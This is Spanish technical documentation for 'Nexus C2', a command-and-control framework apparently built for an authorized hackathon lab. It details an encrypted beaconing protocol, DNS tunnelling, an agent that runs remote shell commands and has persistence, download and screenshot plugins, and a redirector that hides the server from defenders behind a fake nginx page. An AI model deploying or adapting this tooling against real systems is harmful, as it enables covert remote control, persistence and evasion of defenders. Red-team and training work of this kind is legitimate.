# Nexus C2 — Documentación Técnica

> **Contexto:** Hackathon Aligo Defensores Informáticos (24 h, laboratorio cerrado y autorizado).
> **Stack:** Python 3.11+, `cryptography`, `aiohttp`, `requests`.
> **Última actualización:** 2026-06-26

---

## Tabla de contenidos

1. [Instalación y arranque](#1-instalación-y-arranque)
2. [Arquitectura general](#2-arquitectura-general)
3. [Protocolo Nexus — Frame y mensajes](#3-protocolo-nexus--frame-y-mensajes)
4. [Criptografía](#4-criptografía)
5. [Capa de transporte](#5-capa-de-transporte)
6. [Servidor C2 (broker.py)](#6-servidor-c2-brokerpy)
7. [Ciclo de vida de tareas](#7-ciclo-de-vida-de-tareas)
8. [Agente (agent.py)](#8-agente-agentpy)
9. [Sistema de plugins](#9-sistema-de-plugins)
10. [Smart Redirector](#10-smart-redirector)
11. [Panel de operador](#11-panel-de-operador)
12. [Variables de entorno](#12-variables-de-entorno)
13. [Tests](#13-tests)
14. [Reglas críticas y gotchas](#14-reglas-críticas-y-gotchas)

---

## 1. Instalación y arranque

```bash
pip install cryptography aiohttp requests
```

### Arrancar el servidor

```bash
python3 -m server
# Escucha en :8080 (HTTP + WS + DNS UDP :5354)
```

### Arrancar el agente

```bash
# HTTP (por defecto)
NEXUS_AGENT_ID=mi-agente python3 -m agent

# WebSocket
NEXUS_TRANSPORT=ws NEXUS_AGENT_ID=mi-agente python3 -m agent

# DNS tunnel
NEXUS_TRANSPORT=dns NEXUS_AGENT_ID=mi-agente python3 -m agent
```

### Arrancar el redirector (opcional)

```bash
NEXUS_C2_URL=http://127.0.0.1:8080 python3 -m redirector
# Escucha en :9090, reenvía solo frames Nexus válidos
```

### Estructura de archivos

```
HACKATON/
├── protocol.py              # Criptografía, handshake, codec de frames
├── server/
│   ├── broker.py            # Servidor C2 (aiohttp web.Application)
│   └── __main__.py
├── agent/
│   ├── agent.py             # Loop de beaconing y ejecución de tareas
│   ├── transport.py         # Abstracción HTTP / WebSocket / DNS
│   ├── plugins/
│   │   ├── __init__.py      # Dispatcher con whitelist
│   │   ├── sysinfo.py
│   │   ├── download.py
│   │   ├── persist.py
│   │   └── screenshot.py
│   └── __main__.py
├── redirector/
│   └── redirector.py        # Smart Redirector (aiohttp proxy)
└── tests/
    └── test_protocol.py     # 22 tests — pytest
```

---

## 2. Arquitectura general

```
  OPERADOR (navegador web / API)
       |
       | GET /           → Panel web
       | GET /agents     → Lista agentes
       | POST /agents/{id}/task  → Encolar comando
       | GET /agents/{id}/results
       v
  ┌─────────────────────────────────────────────────┐
  │         SERVIDOR C2 — broker (aiohttp)          │
  │  POST /    → HTTP transport                     │
  │  GET  /ws  → WebSocket transport               │
  │  UDP :5354 → DNS tunnel transport               │
  └──────────────────┬──────────────────────────────┘
                     │ Protocolo Nexus (frame binario cifrado)
          ┌──────────┼──────────┐
          │          │          │
      AGENTE 1   AGENTE 2   AGENTE N
```

**Plano de control** (operador ↔ servidor): API REST interna, panel web.

**Plano de agentes** (servidor ↔ agentes): Protocolo Nexus con handshake ECDH propio, cifrado AEAD, beaconing con jitter.

**Separación clave:** cada plano tiene cifrado y autenticación independientes. El servidor solo orquesta; no ejecuta comandos.

---

## 3. Protocolo Nexus — Frame y mensajes

### 3.1 Formato de frame cifrado

```
+--------+------------------+---------------------------+
| TYPE   | NONCE (12 bytes) | CIPHERTEXT + TAG (var)    |
| 1 byte |  little-endian   | ChaCha20-Poly1305 output  |
+--------+------------------+---------------------------+
```

- **TYPE** (1 byte): tipo de mensaje. **También actúa como AAD (additional authenticated data)** del AEAD — si se tamper el byte TYPE, el TAG no verifica.
- **NONCE** (12 bytes): contador little-endian por sesión, nunca aleatorio.
- **CIPHERTEXT + TAG**: payload JSON cifrado + 16 bytes de MAC Poly1305.
- El `session_id` viaja en la cabecera HTTP `X-Session-Id`, **no** en el cuerpo.
- Longitud mínima válida: 1 + 12 + 16 = **29 bytes**.

HELLO y WELCOME son la excepción: van en claro porque aún no existe `session_key`.

### 3.2 Tipos de mensaje

| TYPE | Nombre  | Dirección       | Propósito |
|------|---------|-----------------|-----------|
| 0x01 | HELLO   | agente → server | Inicio de handshake; envía `pub_efimera_agente` (32 bytes) |
| 0x02 | WELCOME | server → agente | Responde handshake; envía `pub_server`, `salt`, `session_id` |
| 0x03 | BEACON  | agente → server | "Estoy vivo, ¿hay trabajo?"; incluye `agent_id`, `hostname`, `os`, `ts` |
| 0x04 | TASK    | server → agente | Entrega un comando con `task_id` |
| 0x05 | RESULT  | agente → server | Devuelve salida de un `task_id` |
| 0x06 | NOP     | server → agente | Sin tarea pendiente; el agente vuelve a hacer beacon |
| 0x07 | ERROR   | ambos           | Error de protocolo o sesión inválida |

### 3.3 Máquina de estados

```
HELLO  ──► WELCOME           (handshake, una única vez por sesión)
BEACON ──► TASK | NOP        (repetido, con jitter)
RESULT ──► (ACK implícito)
```

### 3.4 Payloads JSON

```json
// BEACON
{
  "agent_id": "demo-agent",
  "hostname": "host-01",
  "os": "Linux-7.0.0-22-generic-x86_64",
  "ts": 1719000000
}

// TASK
{ "task_id": "uuid", "cmd": "whoami", "timeout_s": 30 }

// RESULT
{
  "agent_id": "demo-agent",
  "task_id": "uuid",
  "exit_code": 0,
  "stdout": "dandel\n",
  "stderr": "",
  "ts": 1719000001
}
```

### 3.5 Beaconing con jitter

```python
INTERVALO_BASE = 5.0
JITTER_MAX     = 3.0

def esperar_beacon():
    time.sleep(INTERVALO_BASE + random.uniform(0, JITTER_MAX))
```

El panel visualiza el tiempo desde el último beacon con una barra de color que va de verde a rojo.

---

## 4. Criptografía

### 4.1 Visión general del stack

```
X25519 ECDH (clave efímera por sesión)
       ↓
HKDF-SHA256 (+ salt + ambas pub keys en info)
       ↓
ChaCha20-Poly1305 AEAD (nonce counter, TYPE como AAD)
```

### 4.2 X25519 — Intercambio de claves

```python
from cryptography.hazmat.primitives.asymmetric.x25519 import X25519PrivateKey, X25519PublicKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

agent_priv = X25519PrivateKey.generate()          # par efímero por sesión
agent_pub  = agent_priv.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)  # 32 bytes

server_pub   = X25519PublicKey.from_public_bytes(server_pub_bytes)
shared_secret = agent_priv.exchange(server_pub)   # 32 bytes — no usar directamente como clave
```

El servidor tiene un par **estático** persistido en `server.key`. El agente genera un par **efímero** en cada handshake — esto da **forward secrecy** por sesión.

El agente tiene la clave pública del servidor **embebida/pinneada** (`NEXUS_SERVER_PUB` o `server_pub.hex`). `agent_process_welcome` rechaza cualquier servidor cuya pub key no coincida.

### 4.3 HKDF-SHA256 — Derivación de clave de sesión

```python
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

session_key = HKDF(
    algorithm=SHA256(),
    length=32,
    salt=salt,                    # 16 bytes aleatorios del servidor, enviados en WELCOME
    info=b"nexus-c2-v1-session-key" + agent_pub_bytes + server_pub_bytes,
).derive(shared_secret)
```

El `info` incluye ambas claves públicas para **domain separation** — vincula la clave a esta sesión específica y previene ataques con claves distintas.

HKDF es **single-use**: crear una instancia nueva cada vez; `.derive()` más de una vez lanza `AlreadyFinalized`.

### 4.4 ChaCha20-Poly1305 — Cifrado AEAD

```python
from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

chacha = ChaCha20Poly1305(session_key)   # key debe ser exactamente 32 bytes

# Cifrar (TYPE como AAD)
aad        = bytes([msg_type])
ciphertext = chacha.encrypt(nonce, plaintext, aad)

# Descifrar
plaintext  = chacha.decrypt(nonce, ciphertext, aad)
# → lanza InvalidTag si ciphertext, nonce o aad fueron manipulados
```

El TAG (16 bytes) va **appended** al ciphertext — `decrypt()` espera `ciphertext || tag` como un solo blob.

### 4.5 Nonce — Contador por sesión

**Nunca** usar nonce aleatorio: con beaconing frecuente la colisión por birthday bound (2⁴⁸ mensajes) es real. Se usa un contador incremental.

Para que ambos lados compartan `session_key` sin colisionar:

| Lado    | Nonces             | `NonceCounter(start=)` |
|---------|--------------------|------------------------|
| Servidor | Pares (0, 2, 4 …)  | `start=0`              |
| Agente   | Impares (1, 3, 5 …) | `start=1`             |

```python
class NonceCounter:
    def __init__(self, start: int):
        self._value = start

    def next(self) -> bytes:
        n = self._value
        self._value += 2
        return n.to_bytes(12, "little")   # little-endian, 12 bytes
```

### 4.6 AAD — El byte TYPE como datos autenticados

El TYPE byte se pasa como `aad` al AEAD. Esto significa que:
- Si un atacante cambia el TYPE byte sin tocar el ciphertext, la verificación del TAG falla.
- No es posible re-etiquetar un BEACON como un RESULT o un TASK sin conocer la session_key.

```python
def build_frame(msg_type, plaintext, chacha, nc):
    nonce = nc.next()
    aad   = bytes([msg_type])
    return aad + nonce + chacha.encrypt(nonce, plaintext, aad)

def parse_frame(raw, chacha):
    if len(raw) < 29:
        raise ValueError(f"frame too short: {len(raw)} bytes")
    msg_type  = raw[0]
    nonce     = raw[1:13]
    plaintext = chacha.decrypt(nonce, raw[13:], bytes([msg_type]))
    return msg_type, plaintext
```

### 4.7 Anti-replay — Monotonicity check

`SessionState` mantiene `last_agent_nonce` e impone monotonicity estricta:

```python
def check_nonce(self, frame: bytes) -> None:
    nonce_int = int.from_bytes(frame[1:13], "little")
    if nonce_int <= self.last_agent_nonce:
        raise ValueError(f"replay: nonce {nonce_int} ≤ last seen {self.last_agent_nonce}")
    self.last_agent_nonce = nonce_int
```

Se llama **después** de `parse_frame` (primero verificar integridad con AEAD, luego monotonicity) en los tres transportes: HTTP, WebSocket y DNS.

### 4.8 Handshake completo

```
Agente                                                Servidor
  |                                                       |
  |  POST /                                               |
  |  body: [0x01][pub_efimera_agente 32B]  ─────────────► |
  |                                                       | ECDH → shared_secret
  |                                                       | HKDF(shared, salt, info) → session_key
  |                                                       | session_id = os.urandom(32)
  |                                                       |
  |  ◄──────────────────────────────────────────────────  |
  |  body: [0x02][pub_server 32B][salt 16B][1B][sid 32B]  |
  |                                                       |
  | ECDH(priv_efimera, pub_server) → shared              |
  | verifica pub_server == pinneada  (key pinning)        |
  | HKDF(shared, salt, info) → session_key               |
  |                                                       |
  |  POST /   X-Session-Id: <sid_hex>                     |
  |  body: [0x03][NONCE 12B][CT+TAG] ──────────────────► |  ← primer BEACON cifrado
  |         payload: { agent_id, hostname, os, ts }       |
```

---

## 5. Capa de transporte

El agente usa una abstracción `BaseTransport` seleccionada con `NEXUS_TRANSPORT`:

```python
class BaseTransport:
    name: str
    def post(self, frame: bytes, session_id_hex: str = "") -> bytes: ...
```

### 5.1 HTTP (`NEXUS_TRANSPORT=http`, por defecto)

- Frame en el body de `POST /`.
- `session_id` en cabecera `X-Session-Id`.
- Wire: `[frame]`

### 5.2 WebSocket (`NEXUS_TRANSPORT=ws`)

- Conexión persistente a `GET /ws`.
- Sin jitter de beacon (real-time).
- Wire por mensaje: `[sid_len 1B][sid bytes][frame]`

```python
# El servidor lee:
sid_len = data[0]
sid_raw = data[1 : 1 + sid_len].decode("ascii")
frame   = data[1 + sid_len:]
```

### 5.3 DNS tunnel (`NEXUS_TRANSPORT=dns`)

- Frames codificados como subdominio base32 en queries TXT DNS.
- Servidor escucha UDP en `:5354` (no 5353 — ocupado por avahi-daemon).
- Wire de query: `[sid_len 1B][sid bytes][frame]` codificado en base32, partido en labels DNS de ≤63 chars.
- El servidor parte la respuesta TXT en strings de ≤255 bytes (límite del protocolo DNS).

```
Agent → DNS TXT query: AAABBBCCC...ZZZ.n.c2
                       └── base32([sid_len][sid][frame])
Server → DNS TXT response: strings ≤255B concatenadas
```

---

## 6. Servidor C2 (broker.py)

### 6.1 Stack

`aiohttp.web.Application` con un único proceso asyncio. No FastAPI, no uvicorn.

```python
app = web.Application(middlewares=[_operator_auth])
app.router.add_get("/",                           handle_panel)
app.router.add_post("/",                          handle_nexus)
app.router.add_get("/ws",                         handle_ws)
app.router.add_get("/agents",                     api_list_agents)
app.router.add_post("/agents/{agent_id}/task",    api_enqueue_task)
app.router.add_get("/agents/{agent_id}/results",  api_get_results)
```

### 6.2 Estado global en memoria

```python
sessions: dict[str, SessionState]  # sid_hex → SessionState
agents:   dict[str, dict]          # agent_id → {last_seen, status, pending_tasks, inflight_tasks}
tasks:    dict[str, asyncio.Queue] # agent_id → Queue(maxsize=100)
results:  dict[str, list]          # agent_id → lista de resultados (últimos MAX_RESULTS=50)
inflight: dict[str, dict]          # agent_id → {task_id → {task, dispatched_at, timeout_s}}
```

### 6.3 SessionState

```python
class SessionState:
    session_id: bytes
    chacha: ChaCha20Poly1305
    srv_nonce: NonceCounter       # start=0, nonces pares
    agent_id: str | None
    last_seen: float
    encrypted: bool
    last_agent_nonce: int = -1    # anti-replay: nonce más alto visto del agente
```

### 6.4 Validación de agent_id

```python
_AGENT_ID_RE = re.compile(r'^[a-zA-Z0-9_-]{1,64}$')
```

Previene inyecciones XSS/path en el panel y en las rutas de la API.

### 6.5 Autenticación del operador

Middleware `_operator_auth`: si `NEXUS_OPERATOR_KEY` está definida, protege las rutas `/agents*` con `Bearer <key>`. Las rutas del protocolo (`/`, `/ws`) no requieren API key.

### 6.6 Modo clear (para debugging)

Por defecto **desactivado**. Activar con `NEXUS_ALLOW_CLEAR=1`.

Sin este flag, los frames BEACON/RESULT en claro son rechazados con HTTP 400. Solo HELLO está siempre permitido (es el propio handshake que establece el cifrado).

### 6.7 Tareas en background

```python
_on_startup:
  asyncio.create_task(_monitor_agents())   # cada 5 s: marca offline si last_seen > 30 s
  asyncio.create_task(_monitor_tasks())    # cada 15 s: detecta tareas TIMEOUT
  asyncio.create_task(_cleanup_sessions()) # cada 60 s: elimina sesiones inactivas > SESSION_TTL
  asyncio.create_task(_dns_server())       # servidor DNS UDP :5354
```

---

## 7. Ciclo de vida de tareas

```
Operador: POST /agents/{id}/task
       │
       ▼
   [PENDING]  → tasks[agent_id].put_nowait(task)
       │            agents[agent_id]["pending_tasks"] += 1
       │
       │  (siguiente BEACON del agente)
       ▼
  [DISPATCHED] → inflight[agent_id][task_id] = {task, dispatched_at, timeout_s}
       │             agents[agent_id]["inflight_tasks"] = len(inflight[agent_id])
       │             agents[agent_id]["pending_tasks"] -= 1
       │
       ├─ agente responde RESULT ──────────────────────────────────►
       │                                                    [COMPLETE]
       │                                                    del inflight[agent_id][task_id]
       │                                                    results[agent_id].append(...)
       │
       └─ _monitor_tasks() detecta deadline superado ─────────────►
                                                            [TIMEOUT]
                                                            del inflight[agent_id][task_id]
                                                            results[agent_id].append({
                                                              exit_code: -1,
                                                              stderr: "TIMEOUT — sin respuesta en Xs"
                                                            })
```

**Deadline de timeout:** `dispatched_at + timeout_s + 10` (10 s de gracia sobre el timeout configurado en la tarea).

El panel muestra inflight con indicador naranja `N ↗` cuando hay tareas en vuelo.

---

## 8. Agente (agent.py)

### 8.1 Loop principal

```python
while True:
    sid_hex, chacha, agent_nonce = _do_handshake(transport, server_pub)

    while True:
        beacon = encode_beacon(agent_id, hostname, platform.platform(), ts=...)
        frame  = build_frame(MSG_BEACON, beacon, chacha, agent_nonce)
        raw    = _post(transport, frame, sid_hex)

        msg_type, payload = parse_frame(raw, chacha)

        if msg_type == MSG_NOP:
            pass
        elif msg_type == MSG_TASK:
            _run_task(...)   # en el hilo actual; no bloquea handshake
        elif msg_type == MSG_ERROR:
            break            # → re-handshake

        if transport.name != "ws":
            esperar_beacon()
```

### 8.2 Ejecución de tareas

```python
def _run_task(transport, agent_id, payload, chacha, agent_nonce, sid_hex):
    task    = json.loads(payload)
    cmd     = task["cmd"]
    timeout = task.get("timeout_s", 30)

    if cmd.startswith("!"):
        exit_code, stdout, stderr = _plugin_dispatch(cmd)
    else:
        proc      = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        exit_code = proc.returncode
        stdout    = _trunc(proc.stdout)   # límite 64 KB
        stderr    = _trunc(proc.stderr)

    result_frame = build_frame(MSG_RESULT, json.dumps(result).encode(), chacha, agent_nonce)
    _post(transport, result_frame, sid_hex)
```

### 8.3 Identidad persistente

El `agent_id` se genera como UUID en el primer arranque y se persiste en `agent_id.txt`. Sobrevive a reinicios y reconexiones. También puede fijarse con `NEXUS_AGENT_ID`.

### 8.4 Key pinning

La clave pública del servidor se carga de `NEXUS_SERVER_PUB` (hex) o del archivo `server_pub.hex` generado por el servidor. `agent_process_welcome` rechaza con `ValueError("Server public key mismatch — possible MITM attack")` si no coincide.

### 8.5 Backoff exponencial

```python
def _backoff(attempt: int) -> float:
    base = min(10.0 * (2 ** min(attempt, 8)), 300.0)
    return base * (0.9 + random.random() * 0.2)
```

Si el handshake falla, el agente reintenta con backoff hasta 300 s.

---

## 9. Sistema de plugins

Los plugins se invocan con el prefijo `!` en el comando:

```
!sysinfo
!download <url> <ruta_destino>
!screenshot
!persist
!help
```

### Whitelist y dispatch

```python
_REGISTRY = ["sysinfo", "download", "persist", "screenshot"]

def dispatch(cmd: str) -> tuple[int, str, str]:
    name = cmd[1:].split()[0].lower()
    if name not in _REGISTRY:
        return 1, "", f"plugin '{name}' no permitido"
    mod = importlib.import_module(f"agent.plugins.{name}")
    return mod.run(args)
```

La whitelist impide path traversal y ejecución de módulos arbitrarios.

### Plugins disponibles

| Plugin     | Qué hace |
|------------|----------|
| `!sysinfo` | OS, distro, hostname, user, UID, PID, CWD, interfaces de red, sudo |
| `!download` | Descarga URL al agente. Límite 50 MB; cancela si lo supera |
| `!screenshot` | Captura pantalla del escritorio del agente |
| `!persist` | Instala persistencia en el sistema (crontab / systemd) |
| `!help` | Lista plugins disponibles |

---

## 10. Smart Redirector

Proxy intermedio entre agentes y el servidor C2 real. Filtra tráfico no-Nexus para que un defensor que escanee la IP vea solo un servidor nginx genérico.

```
[Agente] ──POST──► [Redirector :9090] ──POST──► [C2 :8080]
```

### Reglas de filtrado

| Condición | Respuesta |
|-----------|-----------|
| `GET /` (cualquier) | Fake nginx 404 en HTML |
| `POST /` con primer byte no en `{0x01..0x07}` | HTTP 200 vacío |
| `POST /` con frame Nexus válido | Forward al C2 |

### Implementación

Usa una `ClientSession` compartida (creada en `_on_startup`, cerrada en `_on_cleanup`) para reutilizar conexiones TCP hacia el C2 y evitar overhead por request.

```python
async def _on_startup(app):
    app["http_session"] = ClientSession(timeout=ClientTimeout(total=30))

async def handle(request):
    if request.method == "GET":
        return web.Response(body=_FAKE_404, status=404, content_type="text/html")
    body = await request.read()
    if not body or body[0] not in _VALID_TYPES:
        return web.Response(status=200, text="")
    session = request.app["http_session"]
    async with session.post(C2_URL + "/", data=body, headers=fwd_headers) as resp:
        return web.Response(body=await resp.read(), status=resp.status)
```

---

## 11. Panel de operador

Accesible en `GET /` (mismo puerto que el servidor).

### Características

- Tabla de agentes con columnas: Estado (online/offline + punto de color), Agent ID, Jitter beacon (barra visual), Cola (PENDING), Inflight (DISPATCHED, naranja si > 0).
- Panel de resultados: historial de tareas ejecutadas con task_id, exit_code, timestamp y output.
- Campo de comando con placeholder de ayuda. Envía `POST /agents/{id}/task` con el comando.
- Polling cada 4 s para refrescar agentes y resultados.
- Sin dependencias externas — HTML/CSS/JS inline en el servidor.

### API del operador

```
GET  /agents                        → lista de agentes con estado
POST /agents/{agent_id}/task        → encolar comando
  body: { "cmd": "whoami", "timeout_s": 30 }
  respuesta: { "task_id": "uuid", "status": "PENDING" }
GET  /agents/{agent_id}/results     → lista de resultados
```

---

## 12. Variables de entorno

| Variable | Defecto | Descripción |
|----------|---------|-------------|
| `NEXUS_SERVER` | `http://127.0.0.1:8080` | URL del servidor (agente) |
| `NEXUS_TRANSPORT` | `http` | Transport del agente: `http`, `ws`, `dns` |
| `NEXUS_AGENT_ID` | UUID generado | ID del agente (sobreescribe agent_id.txt) |
| `NEXUS_SERVER_PUB` | *(lee server_pub.hex)* | Clave pública del servidor en hex (pinning) |
| `NEXUS_ALLOW_CLEAR` | `0` | `1` para permitir frames sin cifrar (debug) |
| `NEXUS_OPERATOR_KEY` | *(sin auth)* | API key Bearer para rutas de operador |
| `NEXUS_DNS_PORT` | `5354` | Puerto UDP del tunnel DNS |
| `NEXUS_C2_URL` | `http://127.0.0.1:8080` | URL del C2 real (redirector) |
| `NEXUS_REDIRECTOR_PORT` | `9090` | Puerto del redirector |

---

## 13. Tests

```bash
python -m pytest tests/ -v
```

### Cobertura (22 tests, todos pasan)

| Grupo | Tests |
|-------|-------|
| NonceCounter | pares, impares, nunca colisionan, siempre crecen |
| Handshake | misma clave en ambos lados, session_id 32 bytes, pub key longitud incorrecta |
| Key pinning | rechaza pub key incorrecta, acepta pub key correcta |
| Frame | roundtrip con 4 tipos de mensaje |
| AAD | TYPE byte manipulado → `InvalidTag` |
| Integridad | ciphertext manipulado → `InvalidTag` |
| Longitud | frame < 29 bytes → `ValueError("too short")` |
| HELLO malformado | tipo incorrecto, demasiado corto, demasiado largo |
| WELCOME malformado | demasiado corto, tipo incorrecto |
| Clear frames | roundtrip, sin payload |
| Beacon helpers | `encode_beacon` / `decode_beacon` |
| Sesiones independientes | dos sesiones con nonces propios sin interferencia |

---

## 14. Reglas críticas y gotchas

### Criptografía

| # | Regla | Consecuencia de ignorarla |
|---|-------|--------------------------|
| 1 | **Nunca usar `shared_secret` directamente como clave** | Output de X25519 tiene estructura matemática, no es uniforme |
| 2 | **HKDF es single-use** — nueva instancia cada vez | `AlreadyFinalized` exception |
| 3 | **Claves efímeras por handshake** | Sin forward secrecy: comprometer una sesión expone las anteriores |
| 4 | **Nonce nunca aleatorio** para ChaCha20-Poly1305 | Colisión probable bajo beaconing frecuente (birthday bound ≈ 2⁴⁸) |
| 5 | **Nonce nunca reutilizado** con la misma clave | Attacker XOR cancela el keystream → plaintext expuesto + MACs forjables |
| 6 | **Incrementar nonce ANTES de cifrar** | Nunca el mismo nonce, incluso en reintentos |
| 7 | **Siempre capturar `InvalidTag`** | Nunca procesar payload no verificado |
| 8 | **TAG va appended** en `encrypt()` — no separado | `decrypt()` espera `ciphertext || tag` como un solo blob |
| 9 | **TYPE byte como AAD** | Sin AAD, el tipo puede manipularse sin invalidar el tag |
| 10 | **Anti-replay: `check_nonce` después de `parse_frame`** | AEAD verifica integridad; monotonicity evita replay de frames legítimos |

### Servidor / Protocolo

| # | Regla | Consecuencia de ignorarla |
|---|-------|--------------------------|
| 11 | **`check_nonce` después de `parse_frame`**, no antes | El nonce en claro no está autenticado hasta que pasa el AEAD |
| 12 | **`agent_id` en el primer BEACON cifrado**, no en HELLO | HELLO va en claro — el ID quedaría enlazable entre sesiones |
| 13 | **`X-Session-Id` en cabecera**, no en el cuerpo | El cuerpo está cifrado con la clave de esa sesión — huevo y gallina |
| 14 | **`_operator_auth` solo en rutas `/agents*`** | Gating `POST /` bloquearía el protocolo del agente |
| 15 | **DNS en puerto 5354**, no 5353 | avahi-daemon ocupa 5353; `OSError(98, Address already in use)` |
| 16 | **TXT strings ≤255 bytes** en respuesta DNS | `bytes([n > 255])` lanza `ValueError`; el protocolo DNS exige este límite |
| 17 | **WebSocket wire format**: `[sid_len 1B][sid bytes][frame]` | Sin el prefijo, el servidor no puede distinguir sesión de carga útil |

### Ciclo de vida

| # | Regla | Consecuencia de ignorarla |
|---|-------|--------------------------|
| 18 | **Idempotencia por `task_id`**, no por nonce | El nonce es para unicidad criptográfica; `task_id` evita ejecutar dos veces el mismo comando |
| 19 | **`_complete_task` guarda antes de logear COMPLETE** | Si hay excepción en el log, la tarea queda colgada en inflight |
| 20 | **`_monitor_tasks` itera sobre `list(...)`** | Modificar un dict mientras se itera → `RuntimeError: dictionary changed size` |

---

*Nexus C2 — Equipo Aligo Defensores Informáticos, 2026.*
